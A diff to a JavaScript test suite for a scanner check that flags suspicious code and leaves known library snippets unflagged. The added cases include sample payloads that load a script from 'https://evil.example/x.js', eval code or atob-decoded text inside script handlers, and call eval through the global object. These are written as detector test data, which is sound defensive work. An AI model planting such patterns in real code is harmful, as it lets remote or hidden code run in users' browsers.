@@ -300,7 +300,7 @@ describe("check 4: warning signs in the code", () => {
     "try{regeneratorRuntime=r}catch{typeof globalThis==`object`?globalThis.regeneratorRuntime=r:Function(`r`,`regeneratorRuntime = r`)(r)}",
     "n=`document`in e&&`onreadystatechange`in e.document.createElement(`script`)?function(){var t=e.document.createElement(`script`);t.onreadystatechange=function(){u(),t.onreadystatechange=null,t.parentNode.removeChild(t),t=null},e.document.documentElement.appendChild(t)}:function(){setTimeout(u,0)}",
     "u&&`onreadystatechange`in u.createElement(`script`)?(i=u.documentElement,function(e){var t=u.createElement(`script`);t.onreadystatechange=function(){p(e),t.onreadystatechange=null,i.removeChild(t),t=null},i.appendChild(t)}):function(e){setTimeout(p,0,e)},d.setImmediate=function(e){typeof e!=`function`&&(e=Function(``+e));for(var t=Array(arguments.length-1),r=0;r<t.length;r++)t[r]=arguments[r+1];return c[s]={callback:e,args:t},n(s),s++}",
-    "var scriptEl = global.document.createElement('script');\n  scriptEl.onreadystatechange = function () {\n    nextTick();\n    scriptEl.onreadystatechange = null;\n    scriptEl.parentNode.removeChild(scriptEl);\n    scriptEl = null;\n  };\n  global.document.documentElement.appendChild(scriptEl);",
+    "scheduleDrain = function () {\n  var scriptEl = global.document.createElement('script');\n  scriptEl.onreadystatechange = function () {\n    nextTick();\n    scriptEl.onreadystatechange = null;\n    scriptEl.parentNode.removeChild(scriptEl);\n    scriptEl = null;\n  };\n  global.document.documentElement.appendChild(scriptEl);\n};",
   ];
 
   it("leaves known pieces of popular libraries alone", async () => {
@@ -319,6 +319,13 @@ describe("check 4: warning signs in the code", () => {
       "var t=d.createElement('script');t.onreadystatechange=function(){t.src='https://evil.example/x.js'},d.body.appendChild(t)",
       "var t=d.createElement('script');t.onreadystatechange=function(){u()};t.text=code;d.body.appendChild(t)",
       "'onreadystatechange' in d.createElement('script'); var t=d.createElement('script')",
+      // Found in review: the element used after the piece, code hidden in its handler, the global object used at once.
+      'var s = document.createElement("script"); s.onreadystatechange = function () { s = null }; document.head.appendChild(s); s.src = "https://evil.example/x.js";',
+      'function go(){var s=document.createElement("script");s.onreadystatechange=function(){s=null};document.head.appendChild(s);return s} go().text = atob(p);',
+      'var go = function(){var s=document.createElement("script");s.onreadystatechange=function(){eval(c)};document.head.appendChild(s)}',
+      'var go = function(){var s=document.createElement("script");s.onreadystatechange=function(){u()};document.head.appendChild(s);s.src=x}',
+      "Function('return this')().eval(payload)",
+      "Function('return this')()['eval'](payload)",
       "setImmediate('alert(1)')",
     ]) {
       expect(await flagged(text), text).toBe("code");
